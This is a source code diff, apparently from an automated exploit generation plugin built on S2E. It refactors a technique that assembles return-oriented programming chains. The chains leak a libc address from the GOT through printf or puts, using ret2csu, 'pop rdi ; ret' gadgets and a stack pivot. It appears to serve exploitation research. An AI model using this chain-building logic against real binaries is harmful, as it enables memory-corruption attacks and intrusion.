@@ -63,10 +63,6 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
     const ELF &elf = exploit.getElf();
     const ELF &libc = exploit.getLibc();
 
-    auto ret2csu = g_crax->getTechnique<Ret2csu>();
-    assert(ret2csu);
-
-
     // A symbol is blacklisted usually because its runtime address
     // won't be resolved under normal circumstances. For example,
     // __stack_chk_fail shouldn't be called at all, otherwise we
@@ -90,9 +86,33 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
 
     assert(targetSym.size() && "No suitable candiate for leaking libc base from GOT?");
 
-    // The following line is for debugging purpose:
-    //log<WARN>() << "targetSym = " << targetSym << '\n';
+    std::vector<RopSubchain> ret;
 
+    if (elf.plt().find("printf") != elf.plt().end()) {
+        ret = getRopSubchainsForPrintf(targetSym);
+    } else if (elf.plt().find("puts") != elf.plt().end()) {
+        ret = getRopSubchainsForPuts(targetSym);
+    }
+
+    assert(ret.size() && "GotLeakLibc: no supported read primitive :(");
+
+    ret.push_back({
+        LambdaExpr::create([&exploit, &libc, targetSym]() {
+            exploit.writeLeakLibcBase(libc.symbols().at(targetSym));
+            exploit.writeline();
+        })
+    });
+
+    return ret;
+}
+
+std::vector<RopSubchain>
+GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
+    Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = g_crax->getTechnique<Ret2csu>();
+    assert(ret2csu);
 
     // Write "%s\n\x00" to somewhere in .bss, so that we can
     // leak 8 bytes from an entry of GOT with printf().
@@ -140,8 +160,7 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
         ConstantExpr::create(0x400, Expr::Int64))[0];
 
     RopSubchain part1;
-    RopSubchain part2;
-    RopSubchain part3;
+    RopSubchain part2 = { ByteVectorExpr::create(fmtStr) };
 
     part1.reserve(1 + read1.size() + read2.size() + prep.size() + leak.size());
     part1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
@@ -150,19 +169,42 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
     part1.insert(part1.end(), prep.begin(), prep.end());
     part1.insert(part1.end(), leak.begin(), leak.end());
     part1.insert(part1.end(), read3.begin(), read3.end());
-    part2 = { ByteVectorExpr::create(fmtStr) };
-    part3 = {
-        LambdaExpr::create([&exploit, &libc, targetSym]() {
-            exploit.writeLeakLibcBase(libc.symbols().at(targetSym));
-            exploit.writeline();
-        })
-    };
 
-    return { part1, part2, part3 };
+    return { part1, part2 };
 }
 
-RopSubchain GotLeakLibc::getExtraRopSubchain() const {
-    return {};
+std::vector<RopSubchain>
+GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
+    Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = g_crax->getTechnique<Ret2csu>();
+    assert(ret2csu);
+
+    RopSubchain part1 = {
+        ConstantExpr::create(0, Expr::Int64),  // RBP
+        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
+        BaseOffsetExpr::create(elf, "got", targetSym),
+        BaseOffsetExpr::create(elf, "sym", "puts")
+    };
+
+    // XXX: Don't hardcode the offset!
+    // p64(elf_base + pivot_dest + 0x30 * 10 + 16)
+    RopSubchain read1 = ret2csu->getRopSubchains(
+        BaseOffsetExpr::create(elf, "sym", "read"),
+        ConstantExpr::create(0, Expr::Int64),
+        AddExpr::alloc(
+            BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
+            AddExpr::alloc(
+                MulExpr::alloc(
+                    ConstantExpr::create(0x30, Expr::Int64),
+                    ConstantExpr::create(10, Expr::Int64)),
+                ConstantExpr::create(16, Expr::Int64))),
+        ConstantExpr::create(0x400, Expr::Int64))[0];
+
+    part1.insert(part1.end(), read1.begin(), read1.end());
+
+    return { part1 };
 }
 
 }  // namespace s2e::plugins::crax
